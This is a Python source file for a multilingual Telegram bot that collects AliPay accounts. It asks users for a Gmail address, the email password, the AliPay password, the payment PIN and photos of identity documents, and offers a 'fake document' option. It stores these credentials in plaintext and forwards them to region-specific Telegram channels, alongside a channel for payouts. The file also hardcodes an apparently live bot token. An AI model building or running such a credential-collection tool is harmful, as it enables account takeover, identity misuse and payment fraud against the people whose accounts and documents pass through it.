# Импорт Библиотек
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.types import KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.state import State, StatesGroup
from aiogram import F
from aiogram.types.input_file import FSInputFile
from datetime import datetime, timedelta
import sqlite3
import asyncio
import logging


# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Ваш Telegram токен и ID каналов
TOKEN = "7650910241:AAGWjzv020ohKhiE2pIaPRLiu1Pw6_ydS2k"
LOG_ID = "-1002420300805"  # Лог-канал для всех аккаунтов
RG_ID = "-1002359652943"  # Канал для другого региона
RB_ID = "-1002468155515"  # Канал для Беларуси
UA_ID = "-1002487887581"  # Канал для Украины
PAY_ID = "-1002425628898" # Канал выплат
DRAW_ID = "-1002487261568"

# Инициализация бота и диспетчера
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
# Состояния FSM

class RegisterAccount(StatesGroup):
    region = State()  # Состояние для выбора региона
    email = State()
    email_password = State()
    alipay_password = State()
    payment_pin = State()
    documents = State()
class LanguageState(StatesGroup):
    choosing = State()

#Иницилизация базы данных
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Создание таблицы, если она не существует
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER UNIQUE,  -- Уникальный идентификатор для пользователя
        username TEXT,
        region TEXT, 
        email TEXT,
        email_password TEXT,
        alipay_password TEXT,
        payment_pin TEXT,
        documents TEXT,
        language TEXT DEFAULT 'RU',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()

#Переводы на языки 
LANGUAGES = {
    "RU": {
        "fake_document" : "🔴 Фейк документ",
        "select" : "❔ Выберите: ",
        "pass_mail" : "🔑 Введите пароль от почты:",
        "pass_alipay" : "🔑Введите пароль от AliPay:",
        "have_pin" : "❔ Есть ли у вас платежный PIN? Выберите один из вариантов:",
        "have" : "✔️ ЕСТЬ",
        "no_have" : "❌ НЕТУ",
        "cancel_state_account" : "❌ Вы отменили заполнение аккаунта. Если захотите начать снова, нажмите 'Отправить аккаунт'.",
        "max_photo" : "📸 Максимальное количество добавленных фото - 3. Удалите лишние фотографии, если нужно.",
        "foto_plus" : "📸 Фото принято. Если у вас есть ещё документы, отправьте их. Когда закончите, напишите 'Готово'.",
        "nice_photo" : "📸 Введите фотографии документов. Когда закончите, напишите 'Готово'.",
        "pin" : "🔑 Введите ваш платежный PIN:",
        "go_photo" : "📸 Отправьте фотографии документов. Когда закончите, напишите 'Готово'.",
        "more_photo" : "📸 Фото принято. Если у вас есть ещё документы, отправьте их. Когда закончите, напишите 'Готово'.",
        "min_photo" : "📸 Минимальное количество фотографий для сдачи аккаунта - 3. Посмотрите инструкцию и добавьте недостающие фотографии.",
        "select_mail" : "📧 Введите почту Gmail:",
        "please_select" : "🌎 Пожалуйста, выберите один из предложенных регионов: Беларусь, Украина или Другой регион.",
        "select_region" : "🌎 Выберите регион аккаунта:",
        "ukraine" : "🇺🇦 Украина",
        "belarus" : "🇧🇾 Беларусь",
        "region" : "🌎 Другой регион",
        "no_user" : "👤 У вас отсутствует username в Telegram. Установите его в настройках, чтобы продолжить.",
        "procces_registration" : "🔋 Вы уже начали процесс регистрации.",
        "comeback_menu" : "📁 Вы вернулись в главное меню. Выберите, что вы хотите сделать:",
        "cancel_button" : "❌ Отменить заполнение ",
        "go_button" : "✔️ Нажимай кнопку!",
        "main_menu": "📁 Вы в главном меню. Пожалуйста, выберите действие:",
        "instruction": "📜Отправка аккаунта в таком формате:",
        "select_language": "🌎 Выберите язык:",
        "language_changed": "🌎Язык успешно изменён!",
        "cancel": "❌ Вы отменили заполнение аккаунта.",
        "registration_complete": "✔️ Регистрация завершена! Ваши данные отправлены.",
        "instruction_button": "📜 Инструкция",
        "select_language": "🌎 Выбор языка",
        "send_account": "✔️ Отправить аккаунт",
        "main_menu_button" : "📁 Главное меню",
        "instructions_def": """
        Отправка аккаунта в таком формате:
1. Регион (Выберите из предложенных вариантов)
2. Почта (Желательно Gmail)
3. Пароль от почты
4. Пароль от Alipay
5. Платежный PIN (Если ставили)
6. Две фотографии (Пример снизу)
""",

    },
    "UA": {
        "fake_document" : "🔴 Фейк документ",
        "select" : "❔ Виберіть: ",
        "more_photo" : "📸 Фото прийнято. Якщо у вас ще є документи, відправте їх. Коли закінчите, напишіть 'Готово'.",
        "min_photo" : "📸 Мінімальна кількість фотографій для облікового запису - 3. Перегляньте інструкцію та додайте фотографії, що не вистачає.",
        "max_photo" : "📸 Максимальна кількість доданих фото - 3. Видаліть зайві фотографії, якщо потрібно.",
        "foto_plus": "📸 Фото прийнято . Якщо у вас ще є документи, відправте їх. Коли закінчите, напишіть 'Готово'.",
        "nice_photo" : "📸 Введіть фотографії документів. Коли закінчите, напишіть 'Готово'.",
        "pin" : "🔑 Введіть ваш платіжний PIN:",
        "go_photo" : "📸 Надіслати фотографії документів. Коли закінчите, напишіть 'Готово'.",
        "pass_mail" : "🔑 Введіть пароль від пошти:",
        "pass_alipay" : "🔑 Введіть пароль від AliPay:",
        "have_pin" : "❔ Чи є платіжний PIN? Виберіть один з варіантів:",
        "have" : "✔️ Є",
        "no_have" : "❌ НЕМАЄ",
        "cancel_state_account" : "❌ Ви скасували заповнення облікового запису. Якщо захочете почати знову, натисніть 'Надіслати обліковий запис'.",
        "select_mail" : "📧 Введіть пошту Gmail:",
        "please_select" : "🌎 Будь ласка, виберіть один із запропонованих регіонів: Білорусь, Україна або Інший регіон.",
        "select_region" : "🌎 Виберіть регіон облікового запису:",
        "ukraine" : "🇺🇦 Україна",
        "belarus" : "🇧🇾 Білорусь",
        "region" : "🌎 Інший регіон",
        "no_user" : "👤 У вас немає імені користувача в Telegram. Встановіть його як продовження.",
        "procces_registration" : "🔋 Ви вже почали процес реєстрації.",
        "comeback_menu" : "📁 Ви повернулися до головного меню. Виберіть, що ви хочете зробити:",
        "cancel_button" : "❌ Скасувати заповнення",
        "go_button" : "✔️ Натискай кнопку!",
        "main_menu": "📁 Ви в головному меню. Будь ласка, виберіть дію:",
        "instruction": "📜 Надсилання акаунта у такому форматі:",
        "select_language": "🌎 Оберіть мову:",
        "language_changed": "🌎 Мову успішно змінено!",
        "cancel": "❌ Ви скасували заповнення акаунта.",
        "registration_complete": "✔️ Реєстрація завершена! Ваші дані надіслано.",
        "instruction_button": "📜 Інструкція",
        "select_language": "🌎 Виберіть мову",
        "send_account": "✔️ Надіслати обліковий запис",
        "main_menu_button" : "📁 Головне меню",
        "instructions_def": """
        Надсилання облікового запису в такому форматі:
1. Регіон (Виберіть із запропонованих варіантів)
2. Пошта (бажано Gmail)
3. Пароль від пошти
4. Пароль від Alipay
5. Платіжний PIN (Якщо ставили)
6. Дві фотографії (Приклад знизу)
""",
    },
    "EN": {
        "fake_document" : "🔴 Fake document",
        "select" : "❔ Select: ",
        "more_photo" : "📸 Photo accepted. If you have more documents, please submit them. When finished, write 'Done'.",
        "min_photo" : "📸 The minimum number of photos to submit an account is 3. Look at the instructions and add the missing photos.",
        "max_photo" : "📸 The maximum number of added photos is 3. Remove extra photos if necessary.",
        "foto_plus" : "📸 Photo accepted. If you have more documents, send them. When finished, write 'Done'.",
        "nice_photo" : "📸 Enter photos of documents. When finished, write 'Done'.",
        "pin" : "🔑 Enter your payment PIN:",
        "go_photo" : "📸 Send photos of your documents. When finished, write 'Done'.",
        "pass_mail" : "🔑 Enter your email password:",
        "pass_alipay" : "🔑 Enter your AliPay password:",
        "have_pin" : "❔ Do you have a payment PIN? Select one of the options:",
        "have" : "✔️ YES",
        "no_have" : "❌ NO",
        "cancel_state_account" : "❌ You have canceled your account. If you want to start again, click 'Submit Account'.",
        "select_mail" : "📧 Enter Gmail:",
        "please_select" : "🌎 Please select one of the suggested regions: Belarus, Ukraine or Other region.",
        "select_region" : "🌎 Select account region:",
        "ukraine" : "🇺🇦 Ukraine",
        "belarus" : "🇧🇾 Belarus",
        "region" : "🌎 Another region",
        "no_user" : "👤 You don't have a Telegram username. Set it as one to continue.",
        "procces_registration" : "🔋 You have already started the registration process.",
        "comeback_menu" : "📁 You have returned to the main menu. Select what you want to do:",
        "cancel_button" : "❌ Cancel filling",
        "go_button" : "✔️ Press the button!",
        "main_menu": "📁 You are in the main menu. Please select an action:",
        "instruction": "📜 Send the account in the following format:",
        "select_language": "🌎 Select a language:",
        "language_changed": "🌎 Language successfully changed!",
        "cancel": "❌ You have canceled the account submission.",
        "registration_complete": "✔️ Registration completed! Your data has been sent.",
        "instruction_button": "📜 Instructions",
        "select_language": "🌎 Select language",
        "send_account": "✔️ Send account",
        "main_menu_button": "📁 Main menu",
        "instructions_def": """
        Sending an account in this format:
1. Region (Select from the options provided)
2. Mail (Preferably Gmail)
3. Email password
4. Alipay password
5. Payment PIN (If set)
6. Two photos (Example below)
""",
    },
    "CN": {
        "fake_document" : "🔴 假文档",
        "select" : "❔ 选择：",
        "more_photo" : "📸 照片已接受。如果您还有更多文件，请提交。完成后，写下“完成”。",
        "min_photo" : "📸 提交帐户的照片数量最少为 3 张。请查看说明并添加缺少的照片。",
        "max_photo" : "📸 添加照片的最大数量为 3。如有必要, 请删除多余的照片。",
        "foto_plus" : "📸 照片已接受。如果您还有更多文档，请发送。完成后，写下“完成”。",
        "nice_photo" : "📸 输入文档照片。完成后，写下“完成”。",
        "pin" : "🔑 输入您的付款密码：",
        "go_photo" : "📸 发送文档的照片。完成后，写下“完成”。",
        "pass_mail" : "🔑 输入您的电子邮件密码：",
        "pass_alipay" : "🔑 输入您的支付宝密码：",
        "have_pin" : "❔ 您有付款密码吗？选择以下选项之一：",
        "have": "✔️ 是",
        "no_have": "❌ 没有",
        "cancel_state_account" : "❌ 您已取消您的帐户。如果您想重新开始，请点击“提交帐户”。",
        "select_mail" : "📧 输入 Gmail: ",
        "please_select" : "🌎 请选择建议的地区之一：白俄罗斯、乌克兰或其他地区。",
        "select_region" : "🌎 选择账户区域：",
        "ukraine" : "🇺🇦 乌克兰",
        "belarus" : "🇧🇾 白俄罗斯",
        "region" : "🌎 其他地区",
        "no_user" : "👤 您没有 Telegram 用户名。请将其设置为用户名以继续。",
        "procces_registration" : "🔋 您已经在注册过程中。",
        "comeback_menu" : "📁 您已返回主菜单。选择您要执行的操作：",
        "cancel_button" : "❌ 取消填充",
        "go_button" : "✔️ 按下按钮！",
        "main_menu": "📁 您在主菜单中。请选择操作：",
        "instruction": "📜 以下列格式发送帐户：",
        "select_language": "🌎 选择语言：",
        "language_changed": "🌎 语言已成功更改！",
        "cancel": "❌ 您已取消填写帐户。",
        "registration_complete": "✔️ 注册完成！您的数据已发送。",
        "instruction_button": "📜 注册帐户的说明",
        "select_language": "🌎 选择语言",
        "send_account": "✔️ 发送帐户",
        "main_menu_button": "📁 主菜单",
        "instructions_def": """
        以这种格式发送帐户：
1. 区域（从提供的选项中选择）
2.邮件 (最好是Gmail)
3. 邮箱密码
4.支付宝
5. 密码
6.照片两张（示例标准）
""",
    }
}
# Выбор языка юзером
def get_user_language(user_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT language FROM users WHERE telegram_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else "RU"

#Тоже зяык юзер йоу 
def set_user_language(telegram_id, language):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Использование INSERT OR REPLACE для обновления данных или их вставки
    cursor.execute('''
    INSERT OR REPLACE INTO users (telegram_id, language)
    VALUES (?, ?)
    ''', (telegram_id, language))
    conn.commit()
    conn.close()

#Выбор языка
@dp.message(
    F.text.in_([LANGUAGES["RU"]["select_language"],
                LANGUAGES["UA"]["select_language"],
                LANGUAGES["EN"]["select_language"],
                LANGUAGES["CN"]["select_language"],])
)
async def choose_language(message: types.Message):
    user_language = get_user_language(message.from_user.id)
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="RU")],
            [KeyboardButton(text="UA")],
            [KeyboardButton(text="EN")],
            [KeyboardButton(text="CN")],
        ],
        resize_keyboard=True
    )
    await message.answer("Выберите язык:", reply_markup=keyboard)

#Реакция на выбранный язык
@dp.message(F.text.in_(["RU", "UA", "EN", "CN"]))
async def set_language(message: types.Message):
    set_user_language(message.from_user.id, message.text)
    user_language = get_user_language(message.from_user.id)
    await message.answer(
        LANGUAGES[message.text]["language_changed"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text=LANGUAGES[user_language]["instruction_button"])],
                [KeyboardButton(text=LANGUAGES[user_language]["select_language"])],
                [KeyboardButton(text=LANGUAGES[user_language]["send_account"])],
            ],
            resize_keyboard=True
        )
    )
def set_user_language(telegram_id, language):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (telegram_id, language) VALUES (?, ?) "
        "ON CONFLICT(telegram_id) DO UPDATE SET language = ?",
        (telegram_id, language, language)
    )
    conn.commit()
    conn.close()
    
# Сохранение данных в базу
def save_user_data(data):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute('''INSERT OR IGNORE INTO users (telegram_id, username, region, email, email_password, alipay_password, payment_pin, documents)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
        data["telegram_id"], data["username"], data["region"], data["email"],
        data["email_password"], data["alipay_password"], data["payment_pin"],
        data["documents"]
    ))
    conn.commit()
    conn.close()

#Отправка инструкции
async def send_instructions(message: types.Message):
    user_language = get_user_language(message.from_user.id)
    instructions = LANGUAGES[user_language]["instructions_def"]
    await message.answer(instructions)
    # Абсолютные пути к фотографиям
    photo_paths = [
       "/home/ubuntu/AlipayBot/ali1.png",
       "/home/ubuntu/AlipayBot/ali2.png"
    ]
    # Отправка фотографий через FSInputFile
    for photo_path in photo_paths:
        input_file = FSInputFile(photo_path)  # Используем FSInputFile для локальных файлов
        await bot.send_photo(chat_id=message.chat.id, photo=input_file)
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=LANGUAGES[user_language]["send_account"])],
            [KeyboardButton(text=LANGUAGES[user_language]["main_menu_button"])],
            ],
        resize_keyboard=True
    )
    await message.answer(LANGUAGES[user_language]["go_button"], reply_markup=keyboard)

#Реагирование на Главное Меню
@dp.message(
    F.text.in_([LANGUAGES["RU"]["main_menu_button"],
                LANGUAGES["UA"]["main_menu_button"],
                LANGUAGES["EN"]["main_menu_button"],
                LANGUAGES["CN"]["main_menu_button"],])
)
async def main_menu(message: types.Message):
    user_language = get_user_language(message.from_user.id)
    await message.answer(
        LANGUAGES[user_language]["comeback_menu"], 
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text=LANGUAGES[user_language]["instruction_button"])],
                [KeyboardButton(text=LANGUAGES[user_language]["select_language"])],
                [KeyboardButton(text=LANGUAGES[user_language]["send_account"])],
            ],
            resize_keyboard=True
        )
    )

#Команда старт
@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    await state.clear()
    await message.answer(
        LANGUAGES[user_language]["main_menu"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text=LANGUAGES[user_language]["instruction_button"])],
                [KeyboardButton(text=LANGUAGES[user_language]["select_language"])],
                [KeyboardButton(text=LANGUAGES[user_language]["send_account"])],
            ],
            resize_keyboard=True
        )
    )

#Выдаем инструкцию
@dp.message(
    F.text.in_([LANGUAGES["RU"]["instruction_button"],
                LANGUAGES["UA"]["instruction_button"],
                LANGUAGES["EN"]["instruction_button"],
                LANGUAGES["CN"]["instruction_button"]])
)
async def handle_instructions(message: types.Message):
    await send_instructions(message)

#Отправка аккаунта
@dp.message(
    F.text.in_([LANGUAGES["RU"]["send_account"],
                LANGUAGES["UA"]["send_account"],
                LANGUAGES["EN"]["send_account"],
                LANGUAGES["CN"]["send_account"]])
)
async def start_registration(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    user_language = get_user_language(message.from_user.id)
    if current_state is not None:
        await message.answer(LANGUAGES[user_language]["procces_registration"])
        return
    if not message.from_user.username:
        await message.answer(LANGUAGES[user_language]["no_user"])
        return
    await state.update_data(username=message.from_user.username)
    cancel_button = KeyboardButton(text=LANGUAGES[user_language]["cancel_button"])
    # Запрос региона
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=LANGUAGES[user_language]["belarus"])],
            [KeyboardButton(text=LANGUAGES[user_language]["ukraine"])],
            [KeyboardButton(text=LANGUAGES[user_language]["region"])],
            [KeyboardButton(text=LANGUAGES[user_language]["fake_document"])],
            [cancel_button]
        ],
        resize_keyboard=True
    )
    await message.answer(LANGUAGES[user_language]["select_region"], reply_markup=keyboard)
    await state.set_state(RegisterAccount.region)

# Обработка выбора региона
@dp.message(RegisterAccount.region)
async def process_region(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    if message.text == LANGUAGES[user_language]["cancel_button"]:
        await cancel_registration(message, state)
        return
    region = message.text
    if region not in [LANGUAGES[user_language]["belarus"], 
                      LANGUAGES[user_language]["ukraine"], 
                      LANGUAGES[user_language]["region"],
                      LANGUAGES[user_language]["fake_document"],
                      ]:
        await message.answer(LANGUAGES[user_language]["please_select"])
        return
    await state.update_data(region=region)
    await message.answer(
        LANGUAGES[user_language]["select_mail"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=LANGUAGES[user_language]["cancel_button"])]],
            resize_keyboard=True
        )
    )
    await state.set_state(RegisterAccount.email)

@dp.message(RegisterAccount.email)
async def process_email(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    if message.text == LANGUAGES[user_language]["cancel_button"]:
        await cancel_registration(message, state)
        return
    await state.update_data(email=message.text)
    await message.answer(
        LANGUAGES[user_language]["pass_mail"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=LANGUAGES[user_language]["cancel_button"])]],
            resize_keyboard=True
        )
    )
    await state.set_state(RegisterAccount.email_password)

@dp.message(RegisterAccount.email_password)
async def process_email_password(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    if message.text == LANGUAGES[user_language]["cancel_button"]:
        await cancel_registration(message, state)
        return
    await state.update_data(email_password=message.text)
    await message.answer(
        LANGUAGES[user_language]["pass_alipay"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=LANGUAGES[user_language]["cancel_button"])]],
            resize_keyboard=True
        )
    )
    await state.set_state(RegisterAccount.alipay_password)


    #"pass_mail" : "Введите пароль от почты:", + 
    #    "pass_alipay" : "Введите пароль от AliPay:", + 
    #   "have_pin" : "Есть ли у вас платежный PIN? Выберите один из вариантов:", +
    #    "have" : "ЕСТЬ", +
    #    "no_have" : "НЕТУ", + 
    
@dp.message(RegisterAccount.alipay_password)
async def process_alipay_password(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    await state.update_data(alipay_password=message.text)
    await message.answer(LANGUAGES[user_language]["have_pin"])
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=LANGUAGES[user_language]["have"])],
            [KeyboardButton(text=LANGUAGES[user_language]["no_have"])],
            [KeyboardButton(text=LANGUAGES[user_language]["cancel_button"])],
        ],
        resize_keyboard=True
    )
    
    await message.answer(LANGUAGES[user_language]["select"], reply_markup=keyboard)
    await state.set_state(RegisterAccount.payment_pin)
@dp.message(
    F.text.in_([LANGUAGES["RU"]["cancel_button"],
                LANGUAGES["UA"]["cancel_button"],
                LANGUAGES["EN"]["cancel_button"],
                LANGUAGES["CN"]["cancel_button"],])
)
async def cancel_registration(message: types.Message, state: FSMContext):
    await state.clear()
    user_language = get_user_language(message.from_user.id)
    await message.answer(
        LANGUAGES[user_language]["cancel_state_account"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=LANGUAGES[user_language]["send_account"])],
                    [KeyboardButton(text=LANGUAGES[user_language]["main_menu_button"])],
                    ],
            resize_keyboard=True
        )
    )

@dp.message(RegisterAccount.documents, F.content_type == "photo")
async def process_documents(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    user_data = await state.get_data()
    documents = user_data.get("documents", [])
    if len(documents) >= 5:
        await message.answer(LANGUAGES[user_language]["max_photo"])
        return
    documents.append(message.photo[-1].file_id)
    await state.update_data(documents=documents)
    await message.answer(
        LANGUAGES[user_language]["foto_plus"]
    )

@dp.message(RegisterAccount.payment_pin, F.text.in_([LANGUAGES["RU"]["no_have"],
                LANGUAGES["UA"]["no_have"],
                LANGUAGES["EN"]["no_have"],
                LANGUAGES["CN"]["no_have"],]))
async def process_no_payment_pin(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    # Сохраняем, что PIN нет
    await state.update_data(payment_pin="НЕТУ")
    # Просим пользователя отправить документы
    await message.answer(
        LANGUAGES[user_language]["nice_photo"],
        reply_markup=types.ReplyKeyboardRemove()  # Убираем клавиатуру
    )
    await state.set_state(RegisterAccount.documents)
@dp.message(RegisterAccount.payment_pin, F.text.in_([LANGUAGES["RU"]["have"],
                LANGUAGES["UA"]["have"],
                LANGUAGES["EN"]["have"],
                LANGUAGES["CN"]["have"],]))
async def process_has_payment_pin(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    # Просим пользователя ввести PIN
    await message.answer(
        LANGUAGES[user_language]["pin"],
        reply_markup=types.ReplyKeyboardRemove()  # Убираем клавиатуру
    )
    # Переходим в то же состояние для ожидания ввода PIN
    await state.set_state(RegisterAccount.payment_pin)
@dp.message(RegisterAccount.payment_pin)
async def process_enter_payment_pin(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    await state.update_data(payment_pin=message.text)
    await message.answer(
        LANGUAGES[user_language]["go_photo"],
        reply_markup=types.ReplyKeyboardRemove()  # Убираем клавиатуру
    )
    await state.set_state(RegisterAccount.documents)
@dp.message(Command("cancel"))
async def cancel_command(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    await state.clear()  # Очищаем текущее состояние FSM
    await message.answer(
        LANGUAGES[user_language]["cancel_state_account"],
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=LANGUAGES[user_language]["send_account"])]],
            resize_keyboard=True
        )
    )
@dp.message(RegisterAccount.documents, F.content_type == "photo")
async def process_documents(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    user_data = await state.get_data()
    documents = user_data.get("documents", [])
    documents.append(message.photo[-1].file_id)
    await state.update_data(documents=documents)
    await message.answer(LANGUAGES[user_language]["more_photo"])
@dp.message(
    RegisterAccount.documents, 
    (
        F.text.casefold() == "готово" or
        F.text.casefold() == "done" or
        F.text.casefold() == "写下“完成”"
    )
)
async def finish_registration(message: types.Message, state: FSMContext):
    user_language = get_user_language(message.from_user.id)
    user_data = await state.get_data()
    documents = user_data.get("documents", [])
    if len(documents) < 3:
        await message.answer(
            LANGUAGES[user_language]["min_photo"]
        )
        return
    save_user_data({
        "telegram_id": message.from_user.id,
        "username": user_data["username"],
        "region": user_data["region"],
        "email": user_data["email"],
        "email_password": user_data["email_password"],
        "alipay_password": user_data["alipay_password"],
        "payment_pin": user_data["payment_pin"],
        "documents": ", ".join(user_data["documents"]),
    })
    await bot.send_message(PAY_ID, f"""
Пользователь: @{user_data["username"]}
Регион: {user_data['region']}
Почта: {user_data['email']}
    """)
    form_text = f"""
👤 Новый аккаунт:
🆔 Пользователь: @{user_data["username"]}
📦 Регион: {user_data['region']}
📧 Почта: {user_data['email']}
🔑 Пароль почты: {user_data['email_password']}
💳 Пароль AliPay: {user_data['alipay_password']}
🏦 Платежный PIN: {user_data['payment_pin'] if user_data['payment_pin'] != 'НЕТУ' else 'Нет'}
"""
    media_group = [
    types.InputMediaPhoto(media=photo_id) for photo_id in user_data["documents"]
    ]
    media_group[0].caption = form_text
    await bot.send_media_group(chat_id=LOG_ID, media=media_group)
    form_text = f"""
{user_data['email']}
{user_data['email_password']}
{user_data['alipay_password']}
{user_data['payment_pin'] if user_data['payment_pin'] != 'НЕТУ' else ''}
"""
    media_group[0].caption = form_text
    target_channel = None
    if user_data['region'] == LANGUAGES[user_language]["ukraine"]:
        target_channel = UA_ID
    elif user_data['region'] == LANGUAGES[user_language]["belarus"]:
        target_channel = RB_ID
    elif user_data['region'] == LANGUAGES[user_language]["fake_document"]:
        target_channel = DRAW_ID
    else:
        target_channel = RG_ID
    await bot.send_media_group(chat_id=target_channel, media=media_group)
    await message.answer("Регистрация завершена! Ваши данные отправлены.")
    # Сброс состояния
    await state.clear()

# Основная точка входа
async def main():
    init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, skip_updates=True)

#Запуск Бота   
if __name__ == "__main__":
    init_db()
    asyncio.run(main())

